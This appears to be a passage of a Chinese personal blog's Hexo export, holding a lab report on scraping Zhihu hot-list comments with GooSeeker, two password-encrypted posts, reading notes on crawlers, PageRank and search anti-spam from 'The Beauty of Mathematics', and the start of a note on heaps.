<p>第四步：右击第一条评论对应结点，选择“样例复制映射–第一个”。</p>
<p>第五步：右击第二条评论对应结点，选择“样例复制映射–第二个”。</p>
<p>可以点击右侧的“测试”按钮对当前的规则进行测试，看到的结果是不是想要抓取的内容。</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403125255689.png" alt="image-20200403125255689"></p>
<p>第二个样例复制映射</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403125250180.png" alt="image-20200403125250180"></p>
<p>测试-&gt;输出</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403125309634.png" alt="image-20200403125309634"></p>
<h3 id="5-创建记号线索"><a href="#5-创建记号线索" class="headerlink" title="5.创建记号线索"></a>5.创建记号线索</h3><p>由于评论有很多页，所以我们要解决抓取数据的时候翻页的问题，需要创建一个“记号线索”。</p>
<p>但是知乎热榜并没有下一页，所以暂时不用</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403125858495.png" alt="5"></p>
<h3 id="6-MS打数机存规则"><a href="#6-MS打数机存规则" class="headerlink" title="6.MS打数机存规则"></a>6.MS打数机存规则</h3><p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403130137855.png" alt="image-20200403130137855"></p>
<h3 id="7-打开DS打数机爬取"><a href="#7-打开DS打数机爬取" class="headerlink" title="7.打开DS打数机爬取"></a>7.打开DS打数机爬取</h3><p>在gooseeker里打开或MS数谋机中导航打开</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403130202413.png" alt="image-20200403130202413">    </p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403130328282.png" alt="image-20200403130328282"></p>
<p>选择任务“zhihu-rebang”-&gt;单搜</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403132206171.png" alt="image-20200403132206171"></p>
<p>单搜完之后，数据默认存储在下面的路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\用户名\DataScraperWorks\任务名</span><br></pre></td></tr></table></figure>

<p>在爬取完后打开</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403135744961.png" alt="image-20200403135744961"></p>
<h3 id="8-导出xlsx数据"><a href="#8-导出xlsx数据" class="headerlink" title="8.导出xlsx数据"></a>8.导出xlsx数据</h3><p>在会员中心、数据管理中导入存储在本地的爬取数据</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403133433216.png" alt="image-20200403133433216"></p>
<p>导出为xlsx数据，成功！</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403133608712.png" alt="image-20200403133608712"></p>
<p>参考链接：</p>
<p><a href="https://www.jianshu.com/p/62bb53e07544" target="_blank" rel="noopener">https://www.jianshu.com/p/62bb53e07544</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li><p>这次的实验学到了爬虫的python相关库、工具，学习了正则式等知识</p>
</li>
<li><p>BeautifulSoup库这种自己操作的让我感觉比较轻松，但是srapy、gooseeker没有弄的太深，只学了皮毛。但是按scrap明显比较成熟，有各种配置可以使用，以后还是得学一手。</p>
</li>
<li><p>在学爬虫之前一直对网络很恐惧，自己不能掌握它，后来学了计网，其实也不过如此。</p>
</li>
<li><p>总的来说这次实验基本都完成了，在学完计网之后虽然理解了原理，但是一直没有实操。这次的实验给了我很多场景去学习，学到了很多。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>实验</tag>
        <tag>信息内容安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-3-22-plan-A</title>
    <url>/2020/03/22/2020-03-22-plan-A/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。\n Oh, this is an invalid password. Check and try again, please." data-whm="解密内容无法验证，但您仍然可以看看。\n Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="加密文章，需要输入密码访问。</br> Hey, password is required here." /><label>加密文章，需要输入密码访问。</br> Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="17f32c9704f93793e12b31d0cc72f0fc8b88c86e8140c834948be9e4fdf6db20">05748cba185f8d68c3b09211d416710687419e42f94450f7b9d3127d606fb6364ce6e13e4331f9fb9d083e6e55a71396dc38fd810cd35c834786723d20752e95528390f7f3057dbf24a85267329e4fadb971109a202775e50afd168d4e36314cb61dc9ef2cc28a68ffd56b817531d8d42e8b576546d3e05efcc4b71716634481c14e332cd49f43b04e2ad633260631d3bc536168bea3ef95ab2e859acbadba53a61635f4610e5dd570fa878a5ede89daced4a40d189e0db2b1459969aede502d37118bc19a811f8270b9153672116b82faf1774d318bb6cc9d4299a1976a7af09706e6d169729fca17b17116e849dc4aae65973cd3c3adca8707fe8ab10038b3db9f0fa2e5f171596e051baa61fc496ce4d34a6d62d908223aa51382d01a0bc7d2500ba1f396b138d76a7f8e39efa71bad4a713f9a1e26f0665b4acec94fed965ebad95626258ef3413c8c98a519bffd32248b54fea1c09daa9b9122c3ec6a70f217c2959d7f639a8261d4bd34a49754550fd0772b35c2d15e538cde9406b342d3cc8ef25ed11a83f0a6668cde728b8f4afd884bafe977807551076d23c47d10f4d7ff9bb3e00b9e34168efa1f9227d455b4a85b306140043c2123a6030727e306a37d74a07e44310ab1513caa7386bba877efb95c55321522333932d04c1d2aee6a461f94768230244e40d9259069fe93c435e5df68cea53266cc3df4d51bf72d1bd8db837735e0c534c76b3021363be325563b736b18e17432440e77f80b49d659bc99eba095877fc2bcdd7153831ef5478d50dc557135985513f45cbfe7a96882480bd8228120bb349391ff0563481bfcb64177598d7675e4c64d0e055341b778d5a753c4b5b7bfc3de7e2f6d7da9b280fdbc7521152511211abd5bd2b68ebfdcc3f52844074a8f3b6014f465bcc4ab12ea0f224511daa359b6def554281df5f8e4fde4dd85396a1bc1057a61a1c92e8a3526467569ab72b39d68464dde7ad27cb6db72107affb4bb115f10245e78575354a79fb081160ac26a00342629b4adcdabae14cca4f7aabcb4d30d1d2d658650c176d2f6ae3406d94af5a639aca2bf243c0118553fca63c9228b6afa84fe8bd4951ff4579b922e202fdba9c2ea5bbadb30e7c69e5d28a4b25332c6683b83f6300e71323e445a28736d93b063250a81ed7de88aecb8d1fe031e0911fc7fed3b444605bfbffc8910e3acf3d769c06b24e4b9e316f7398e2f6ed49f3f7555a5b12dd56bb55b78537d097246ffb9320463c039cc86d3f1e685b6e1be251b12b026ee34327cb046a21e70151303f86a303c861a5e9ff47042f30a813e52b8fa49abc7bb59afa859c0a05442344eef78be8b0ce7708768837d18b8e06e4f103e2cb972869e7c709489f36d848233c8a87d133e2f3319523a23c114b8252a9264ae412409d01311aca1b6a4919a0a7146153eb5a9b9b48ddd78d98f87c3ce01cfc0dae7e9cbd35206b1b03d886d0ddff0fbc1e2603e4100521ce9ed59bb0f631b4e5d0f9c2957b89fad8a99448e21a55a3778a3f5b4623dd0b4bd12e7993a6477bba4121f5c8b12b7c7b0f3c50ba248ffba11ddb482d7eee876921a98c8e8ff427c254db41635399e8c43f36c0d670752fab9dadc302303175e24bc296ed6e390b8e8f743908d91beb07526b370387326ffed5bd6fc70690b7ca13b18387945741ba8ce3163653640369f16a669f39e92c0586138f6fc1737a5ddea2319f172ce75d0bbdb3d5633bf14fb4ed3b06faed9051d9356fa2a496545eaf910b6e2fe01b9e20a1f2e42def878170bced600c11c580960ae420cb8d6a062d7012f38c7e1b71092ca5d3a49b53696156fdd1b527be9a687112a5ccc5ee0e9ed4a0cef2f56f459e0bcc514db5773c88793481d72ec3f290ac051328c9317de82a9d941b7bbab17dab198839947856d4352ac3def581a34fb343269ce59d11cc7797dae1c4e0489c2b8cadca881aa9d909d8e84aa81e5795a19318d7eb4844eb31ba485d1d6438c82d75eb7112760c801a99794f3dca42756f8e0b846cc7191340a46d897cad720440ce56751948048502edb7b09a35cb3e94499e11e4f70a7a6cd67f46d6c075a4253845bc4bbab6acbb1989132d4211368efca167b55884232c03458b6c5fa71bd15d017a2454706a5bf1755c62c6e4d7a3edd954d20e2b0d7d58903e50572cc9702c0dd7734d742224ada390fb75dd8c48c149bf7a353a60f36e648df04bdfabfa10b99431fc4e54376df33954f77c48fad41f72612418e546734c733c3ce1c5fe3306e71eae44dba45b2ff65e70be007d6268123e770379247125ebc2c2df920cf7dbc3fc07b7e2a63d71088780ab63158773801ae691f89d701f5137ba373232b3818c4b6611d4e2097b33f2b9542019f41d6dae0b8a3254e2244dc90bbf9f31717624061e3dc236dae1e6a7175ee20bcf052d7bd61278a5cb5282ed7a579bc78e6c21a3d364fbfe3351cddd854c257a5321839240d86491b443a5a85faaad8005c251e4679d520a67a6dcf6272e34625495302b8836260f1dacb67e9beb3cb2787b91a99c86cffcb1dff6e8fb502a94c75c9244f3a5387e28c0b74418089dbb9b813ccf5991c0b9249bf3b174b3acaffe56ec67914ad9e3e2a8aee680064056efa0a8e33055fcf5f8e3eb01f7ca200116c07ef89bda0662215d8e0817a03148d25e2572b3bd94faa8b921465a4e64ddc82e1e7313d6f1586e99d485ffdd1a65c2672c580bb0a04aceb7056ad42e6b0b5d50facdc50eee7abc395085e559c2d3a09ffe12243c70c6a058edb59eb702007f83adbaded9f730adfb0137430116c7edb6642fd2f354ff3fd84a8555873846285e8ffb0ac8503136e44a8ae5fd7b366a14ab74e46f81d8d8506dab0c0c4dfb535dc0ddddd4d2265f80163960db06962d2da2c36ba024b9beb15a5ad29a9e9c27676c2ca4a2973b36a3acd01352dd84e207afc4f2e66e0d56d92379b90912763ce41e4fb6e452bb21eae1b1da284a1bed3c26e50379869f832760449bd5e4cb3d079e45f9238ca100473d1190b6887b20a2646b47e76659076e0a4846844cf0694e2bacca8077280d09b675092bf8806fd942b04ab946dce55919c0422d4c826530b43f99c6e3dd6f7bdd932be3d6de7b73b914f9996f2da62b14e31e4b4d9cfbc1fe61b1836fb7ee1de3a88393e22bf80334bfa1c605c1606fe9ad9bfde8fa33a23b9ab8e63bdf20a8e70d5817b51d3243e9214e6fead3ab546077c99aa836c8dcf82a22744fa84a17c6380babdab4daff4a872696a424877ef588f9ea28abf8dd6e15e44f959187e37ffd90cfe4382df49492614151b9ecdbe81c1abe583bccb3aae97d9e1d23893a8a7e20f25468bbeb84af4406b6490922626004ddec9f0e1d38c261b40da8ab1d6a9c72552d60c672f85a99da7c9cb22bad1bc21078b8b93928d8607846698bfc0c0643881e14f2636f1520960d97eff8faeb936e8948e3d2c61ec6b406d4f81890f5bd5e6a1196e4478e900f1278a987f7ec9991bc2413e11e7aee290ef47e21b805c2ffdc0d2355395d87d548f38cfc98b7dd6bef00d9f492f005711158cee74d418f104362ffb7ca5e09779665a50dc8db786f90dc702f6808cdc68ec5a0500d18cdf0a444af441d8b398c3e631c2b23ebf1791476ae3744eb88d839c17f9f9ec79e170338399686443f0fb7b7f9c8b7c0cded9391f84d6127b9ca6619df52e107e184894b9e5a3507698450a5ffa152cecdd6d7958bf8fccc997828ebb4073a4301442ac7b84da4051de849bcc1e97a2de7b24abaf01aec40db7a3f197b1de703a4a7abe05650d1d0fce309e79c8b7e53b383274d680b87bee042be6708b15a4fd554aee03ea598638046f982d0702a6827a8b505b86033435b80e4c73dbe33a50de0b4fbc8fcc251601583e26fcee4df8cf74d993e9de0409ca8a135f8165da7012713462cad9b57bb5ac027e0ed06388bef5b40859f904c5155fddfec7053e4c4b5d19005f9c568d1f501aa781fcedeb9b38503fc547135ebc75b2876958150e916d15c629a4ff26375eaed7a8b8fcae086534559d6a317293fa170744c32786a4ea4959ac9342557e23c6586d64cc633ef0cc9931b3e4b12cf833045d0f8ae865b15ecaf8c84c3bd1e5636990e965c7eddaae377f72b731bf01b8d3ef26d95c3cac14001f353350cd53048f636049a9b9d4ca956143cb3f08eb60b52344cd1a52</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>密文</tag>
      </tags>
  </entry>
  <entry>
    <title>ANKI的使用</title>
    <url>/2020/03/08/2020-03-08-anki-1/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。\n Oh, this is an invalid password. Check and try again, please." data-whm="解密内容无法验证，但您仍然可以看看。\n Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="加密文章，需要输入密码访问。</br> Hey, password is required here." /><label>加密文章，需要输入密码访问。</br> Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="605d19e89c87952032eb35c4e29ed54c361128be53a5ffad74973d9a1bdbcd8d">6fa2315c28c41d482c80d8e5f16af948827d9d289c5f3cc96c5e94a0696b3b336255c52250649d58c7dc04bd7e24c7e5a2b97be5a075311aedc4038deb2321a2abb4eddf5701f65545289716558d71c821ed4a540916d7aa518c7bf4eabf2d324eb442ef14fe5c155dc1b90ed1304b4339cf8a6f9f77982601b340f42dcd6b585533224ac91f1d62d290c6437b7c071119d3e883c6aa64ade709e76884c3692a9b0f15b12d950ef3c70654c0e8efaddacf28a3e17c7ea3948d61fae157641702aef438245c52dc07dd1bdfe4f35671b6e471fbc50ee888626bc0995bbb916c3da3d84713a5bcffa2af079a1ef5d8cd9a3fe5e3cdd2737740889a2b5896218ab4dc21da249ecb6c9fab12ee88328d5779a60df014be6a0431e4edb11e984f87d088420603b351194ca020d36d72267641251f19a61243611dbe19e3379fc7a4a6ede69d933a37b23980d48f3d94ecfad0c571c8688ffbb8ccd84e2008f08f38aba73cb18d5465660260140ff4eb49d5b9229e908026b1859855215df159956905c9ef55637ec8e63dcee840a811df401347f17d3f2db64f045ea81bc2e8ff245258183010a98682eaa65a6f55376d6c4ad2d15849603576bfa5c5af66d5e22b545993180886b735b953131e6f95a3cd85f09b0f7b3bf20571ac8be4aaa47fd7fb684cf21b9b37a3cd54e5b67081f14e6d6aaa3714c1b94e85936781cc1114c685f64038b31a99dbc624f495ace843c470b82d56b62d3cee8733d3ff17e1b6f6ba87089d7fb15e6f6637e0d2c6810ec131a1af98eaebe0402245ab4b0eea12869c3baf05cfb9db1c1c9a1459cdf986c35833ed8090622c5a990555fe54027f31b34952680849eee328db3be26f09b6b8ba29bc654ec2b2cfa58ed659f64e02e88d730a96969a81b8a07b63c44dad854ff4782f10bda1051cbb10d88c348e327ab12031170b1084e05e1f3cd2aedbd6c732af0e047aaf071be2b6772ee796a950b7825771f856a43354becbd92cf048e2ffec626a427272cb84bcb34537ad896eae0f280eefdc2ef76f5e23589a9b9f5cd4a444675c1c390a518f8304dc800e76f901f542e2ee9fd9bdbdda4215945f90a59c8d9ac1da35feea189937ab4151ae5f7523b633d6a5451f37d338132d7cf63e0450f9461f3b3c6e7e079e306e4af282be3c035db39b027524afde533d64317e2521e487c382d52ee39e543caf9ee55d433af655faa0d3f047ea16c0c0e2b0ece156c39ee5adf0607ec97cb8cba1a9511e61180cac8531b51cdd08c7759fb7900f58b42a3eac23417158b871d8358e6258dbbed72be94e1457d5eca7e4ad82d65d21160e23925bae2f65dfc627b6b67c9ed55caa98ea5b15fa633748e3fb44a2317e55210981a0173a14310fa0da1648391a038ef8c37fb422bf3916fa66263f9e0888b88c877f7f8035e60ad8b5042cad95421220f403db04986305e8894a9a7ae47662d6e9aa0a587536ce18c62ca8d8bb64a6222c653efbdaffb20bddb43b672d904e7020d17c7a1e3426f791376dd9d7a4afd8803f97efd895a08e31c7059b7bd72ad571234cc88128de13ddca586cebb7334d1e4d75f0099c6db0e66ed0c3c4a327bb37aed738149f90508e551c5917b4a9aef25d561ae20e58d67aa4f26738161141c80864000ace618382b6b0ad1c8ad91fe970adf49a79dfba75ffbea8952c7d8d13ca654245b10f64ebb11da32548158d535bbecc628eb2c3b42bcd</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>密文</tag>
      </tags>
  </entry>
  <entry>
    <title>数学之美</title>
    <url>/2020/03/07/2020-03-07-beatuy-of-mathematics/</url>
    <content><![CDATA[<h1 id="数学之美"><a href="#数学之美" class="headerlink" title="数学之美"></a>数学之美</h1><p>《数学之美》是人民邮电出版社于2012年5月出版的图书，作者吴军，2014年再版。书中将高深的数学原理讲得更加通俗易懂，让非专业读者也能领略数学的魅力。通过具体实例教会读者在解决问题时如何化繁为简，如何用数学去解决工程问题，如何跳出固有思维不断去思考创新等。</p>
<h3 id="第九章-图论和网络爬虫"><a href="#第九章-图论和网络爬虫" class="headerlink" title="第九章 图论和网络爬虫"></a>第九章 图论和网络爬虫</h3><h4 id="图论定义"><a href="#图论定义" class="headerlink" title="图论定义"></a>图论定义</h4><p><img src="/2020/03/07/2020-03-07-beatuy-of-mathematics/image-20200307165641288.png" alt="image-20200307165641288"></p>
<p>七桥问题：一个步行者怎样才能不重复、不遗漏地一次走完七座桥，最后回到出发点。</p>
<p>后来大数学家欧拉把它转化成一个几何问题——一笔画问题。在解答问题的同时，开创了数学的一个新的分支——图论与几何拓扑，也由此展开了数学史上的新历程。</p>
<p>PS：连通图可以一笔画的充要条件是：奇点的数目不是0 个就是2 个。</p>
<h4 id="BFS广度优先遍历"><a href="#BFS广度优先遍历" class="headerlink" title="BFS广度优先遍历"></a>BFS广度优先遍历</h4><p>爬虫用到了图论的遍历（Traverse）算法</p>
<p>BFS广度优先遍历（Breadth-First Search）算法如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 初始只有一个已有节点</span><br><span class="line">2. 遍历当前已有节点的邻接节点，加入已有节点</span><br><span class="line">3. 重复步骤（2）直到不再有新的已有节点</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/2020-03-07-beatuy-of-mathematics/image-20200307162611791.png" alt="image-20200307162611791"></p>
<p>广度遍历的次序图（从北京开始）</p>
<h4 id="DFS深度优先遍历"><a href="#DFS深度优先遍历" class="headerlink" title="DFS深度优先遍历"></a>DFS深度优先遍历</h4><p>DFS深度优先遍历（Depth-First Search）算法如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 初始只有一个未被标记节点</span><br><span class="line">2. 查找未标记的节点的邻接节点A，找到节点A被标记</span><br><span class="line">3. 进入该节点A第一个未标记的邻接节点B,将其设为A</span><br><span class="line">4. 回到2直到所有节点遍历完</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/2020-03-07-beatuy-of-mathematics/image-20200307163047990.png" alt="image-20200307163047990"></p>
<p>深度遍历的次序图（从北京开始）</p>
<h4 id="网络爬虫-Web-Crawlers）定义"><a href="#网络爬虫-Web-Crawlers）定义" class="headerlink" title="网络爬虫(Web Crawlers）定义"></a>网络爬虫(Web Crawlers）定义</h4><ul>
<li>互联网-就是一张大<code>网</code>（图）</li>
<li>一个<code>网页</code>为一个<code>节点</code> node</li>
<li>网页中的<code>超链接</code>是一条<code>边</code> edge，连向其他<code>节点</code>（网页）</li>
<li>网络爬虫正是<code>遍历</code>（访问）这张网并且<code>下载网页</code>（获得信息）的程序</li>
<li>使用<code>哈希表</code>（Hash Table）来记录一个网页是否被访问</li>
<li>现在的Google等公司使用的爬虫程序都是<code>并行的</code>、<code>多设备</code>，需要好的<code>并行算法</code></li>
</ul>
<h4 id="搭建爬虫工程要点"><a href="#搭建爬虫工程要点" class="headerlink" title="搭建爬虫工程要点"></a>搭建爬虫工程要点</h4><ul>
<li>用什么<code>遍历</code>算法？</li>
<li>页面的分析和URL的提取？</li>
<li>URL记录表 <code>已遍历哈希表</code>的并行问题</li>
</ul>
<p>1.用什么遍历算法？</p>
<p>一般来说，为了快速遍历重要的网址（比如腾讯主页中URL），用<code>BFS</code></p>
<p>而为了减少目标服务器消耗（如TCP连接的握手次数过多，下载效率降低），用<code>DFS</code></p>
<p>但是一般都没这么简单，需要一个复杂的复杂的<code>调度系统</code>Scheduler，工程上使用<code>优先级队列</code>与<code>BFS</code>类似</p>
<p>2.页面的分析和URL的提取？</p>
<p>由于很多网页HTML都是用脚本语言<code>javascript</code>来生成的（或逻辑控制，数据嵌入），所以一个HTML中的URL并不是显而易见的，需要通过浏览器渲染（运行javascript），所以一个好的爬虫需要熟悉浏览器内核的人来编写。</p>
<p>3.URL记录表 <code>已遍历哈希表</code></p>
<p>由于一个URL可能被很多网页超链接。</p>
<p>如果爬虫足够大，爬取URL太多，那么在上千台服务器中，这个<code>遍历哈希表</code>就会变得相当大，维护很困难。这里的维护指的是哈希表的<code>同步</code>（避免重复下网页发生冲突）、<code>存储</code>（会大的一台服务器都存不下）</p>
<p>使用如下两种手段来控制</p>
<ul>
<li>明确分工、如指定某个域名由某台机器爬取</li>
<li>把哈希表存储在一组独立的服务器上</li>
</ul>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p><img src="/2020/03/07/2020-03-07-beatuy-of-mathematics/image-20200307172007654.png" alt="image-20200307172007654"></p>
<h4 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h4><p>之前在数据结构、离散数学中都学过图论，但是当时都是学了一遍便忘了。</p>
<p>直到近期在做一个项目，设计到了图论的遍历、最短路径问题。</p>
<p>才知道图论是如此的有意思，而这次看爬虫也是图论，算是再复习下吧，数学不愧是万物之源啊。</p>
<h3 id="第十章-PageRank（网页排名）"><a href="#第十章-PageRank（网页排名）" class="headerlink" title="第十章 PageRank（网页排名）"></a>第十章 PageRank（网页排名）</h3><p>网页排名是对搜索结果的分析，使那些更具“重要性”的网页在搜索结果中的排名获得提升，从而提高搜索结果的相关性和质量。</p>
<h4 id="Google的page-rank"><a href="#Google的page-rank" class="headerlink" title="Google的page rank"></a>Google的page rank</h4><h4 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果一个网页被其他网页所链接（投票），说明其受到了普遍的承认和信赖，那么此网页的Rank排名就高。</span><br></pre></td></tr></table></figure>

<h4 id="算法细化"><a href="#算法细化" class="headerlink" title="算法细化"></a>算法细化</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对每个网页的 投票权重 做区分（就如股东大会的表决权）</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/2020-03-07-beatuy-of-mathematics/image-20200307173646445.png" alt="image-20200307173646445"></p>
<h4 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h4><p>将<code>Pagerank</code>用<strong>向量</strong>表示，并且用<strong>矩阵相乘</strong>的方法来<strong>迭代</strong>计算<code>Pagerank</code>。</p>
<p>初始的排名从哪来？全部设为1/n</p>
<p>（够暴力吧，理论证明，无论<strong>初值</strong>如何取，这种算法都能保证网页排名能收敛到<strong>真实值</strong>，无需人工干预）</p>
<p><img src="/2020/03/07/2020-03-07-beatuy-of-mathematics/image-20200307183507652.png" alt="image-20200307183507652"></p>
<h4 id="实际问题"><a href="#实际问题" class="headerlink" title="实际问题"></a>实际问题</h4><p>矩阵过于大计算量大，使用<strong>稀疏矩阵</strong>的计算技巧。</p>
<h4 id="目前的发展"><a href="#目前的发展" class="headerlink" title="目前的发展"></a>目前的发展</h4><p>当今影响搜索引擎的质量的有如下几点：</p>
<ul>
<li><p>好的<strong>索引库</strong>，如果一个URL没被索引，它就不可能被查到。</p>
</li>
<li><p>网页的<strong>质量的度量</strong>，如pagerank。</p>
<p>目前的搜索引擎算法对网页质量的衡量复杂多了，是全方位的，质量的衡量以考用户点击等数据。</p>
<p>顺带一提：因为google拥有的庞大数据积累，使得后来的搜索引擎无法超过他。而当年google刚成立时，pagerank算法的专利保护很好的保护了它度过了前期的<strong>数据积累</strong>时期。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据也是一种资本，这导致了，即使你现在做一个比百度还好的算法，却不可能替代它在国内的地位了。</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>用户偏好</strong>。用户的喜好不同推送不同的内容。</p>
<p>目前的B站、知乎、淘宝的推荐都是用机器学校来判断你的喜好类型。这里批评一下，目前的推荐都是单调（只有个人的喜好）、且更新过于恶心（新<code>类型</code>的权重会很大，导致下次刷新都是该类型）。</p>
</li>
<li><p>与用户搜索的相关性。如果是做个人站的搜索，用TF-IDF就可以满足要求，而大公司的相关性判断则复杂的多。</p>
<p><strong>TF-IDF</strong>（term frequency–inverse document frequency）是一种用于信息检索与数据挖掘的常用加权技术。<strong>TF</strong>意思是词频(Term Frequency)，<strong>IDF</strong>意思是逆文本频率指数(Inverse Document Frequency)。</p>
<p>一篇文章的相关性分数：TF*IDF。</p>
</li>
</ul>
<h3 id="第十八章-搜索引擎反作弊及搜索结果权威性"><a href="#第十八章-搜索引擎反作弊及搜索结果权威性" class="headerlink" title="第十八章 搜索引擎反作弊及搜索结果权威性"></a>第十八章 搜索引擎反作弊及搜索结果权威性</h3><h4 id="搜索引擎的反作弊"><a href="#搜索引擎的反作弊" class="headerlink" title="搜索引擎的反作弊"></a>搜索引擎的反作弊</h4><p>作弊<strong>SEO</strong>是伴随着搜索引擎排名产生的。搜索结果排名靠前的不一定是高质量的相关网站。</p>
<p>常见的<strong>作弊手段</strong>：针对<code>tf-idf</code>的<code>重复关键词</code>、针对<code>PageRank</code>的<code>链接站</code>（专业买卖链接URL）。</p>
<p>关于<strong>落地页</strong>（LandinPage），其内容质量高，但是里面暗藏js跳转，一进去就跳转到一个商业网站。</p>
<p><strong>反作弊的哲学</strong>：一般小的搜索引擎没有作弊不是因为他们反作弊很好，而是因为作弊商看不上这些小站。</p>
<h4 id="如何反作弊"><a href="#如何反作弊" class="headerlink" title="如何反作弊"></a>如何反作弊</h4><p>抓作弊成为了“<strong>猫捉老鼠</strong>”的游戏，没有一劳永逸的方法（信息安全也是如此）。</p>
<p>透过具体问题，看本质和动机，解决问题。反作弊也是如此，需要“道”。<strong>术即是表层，道即事物本质。</strong></p>
<p>而通信模型对于搜索反作弊依然适用。在通信中解决噪声干扰问题的基本思路有两条。</p>
<ul>
<li>从信息源出发，加强通信（编码）自身的抗干扰能力。</li>
<li>从传输来看，过滤掉噪声，还原信息。</li>
</ul>
<p>如下图，原始的信号混入噪声，在数学上表现为他们两个做了卷积，消除噪声的过程就是解卷积的过程。</p>
<p><img src="/2020/03/07/2020-03-07-beatuy-of-mathematics/image-20200307184140323.png" alt="image-20200307184140323"></p>
<h4 id="反作弊中”道“的扩展"><a href="#反作弊中”道“的扩展" class="headerlink" title="反作弊中”道“的扩展"></a>反作弊中”道“的扩展</h4><p>一个判断<code>链接站</code>的思路：</p>
<p>将网站的出链（其指向的URL）作为一个向量，它是这个网站的固有特征。</p>
<p>而通过对两个网站的向量计算余弦距离，若两个网站的出链URL几乎相同，则其出链向量的余弦距离为几近于1。</p>
<p>另一个判断<code>链接站</code>的思路：</p>
<p>由于<code>链接站</code>普遍两两链接，所以使用<code>图论</code>来寻找这些互联网中的<code>闭环</code>，就可以找到<code>链接站</code>。</p>
<p>可以看到，这两个思路都用到了数学，赞美数学！</p>
<h4 id="搜索结果的权威性"><a href="#搜索结果的权威性" class="headerlink" title="搜索结果的权威性"></a>搜索结果的权威性</h4><p>权威性：例如医疗方面的问题，需要判断搜索结果是否完全可信，这就是权威性的判断。</p>
<p>如何判断权威性呢？</p>
<p>一个概念 “<strong>提及</strong>”（Mention）。</p>
<p>如果一个主题中的信息页中，有某个机构普遍、多次被“<strong>提及</strong>”，那就有理由判断其是权威的。</p>
<p>计算权威有两个难点：</p>
<ul>
<li>“<strong>提及</strong>”需要<strong>自然语言处理</strong>NLP（natural language processing），得知文本内容的意思。</li>
<li>权威是与领域相关的，一个机构在医学领域是权威的，但其在其他领域不一定相关。</li>
</ul>
<h4 id="权威性计算"><a href="#权威性计算" class="headerlink" title="权威性计算"></a>权威性计算</h4><ol>
<li><code>句法分析</code>，寻找涉及主题短语、对信息源的描述。</li>
<li>利用<code>互信息</code>，寻找道主题短语和信息源的相关性。</li>
<li>对主题短语进行<code>聚类</code>，这里需要用到NLP，比如”吸烟的危害“和”香烟的危害“是相同的。</li>
<li>一个网站也要分成不同的领域来判断。</li>
</ol>
<p>（句法分析、互信息、聚类后面都是数学!）</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>虽然先前都有了学习，但是看了这几章，还是不得不赞叹数学、信息论的力量。</p>
<p>从网络爬虫中的图论知识，到PageRank中的矩阵运算，TF-IDF、反作弊中余弦、闭环的巧妙运用等等。</p>
<p>都是数学的应用体现，<del>麻麻再也不担心我讨厌数学了</del>。</p>
<p>收获还是有的吧，爬虫和pagerank课上都学过了，这里权当复习了。</p>
<p>而互联网为啥叫网，我终于清晰的了解了。反作弊我还是第一次学习到，很有趣。</p>
<p>在互联网时代，学这些是有好处的，毕竟网络已经无处不在，学这些有利于“生存”。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-03-06-algorithm-2</title>
    <url>/2020/03/06/2020-03-06-algorithm-2/</url>
    <content><![CDATA[<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>定义：堆是一个完全的二叉树，每个节点都满足（任一父节点的键值都不小于子节点的键值）</p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306143043099.png" alt="image-20200306143043099"></p>
<p>非升序排列的二叉树</p>
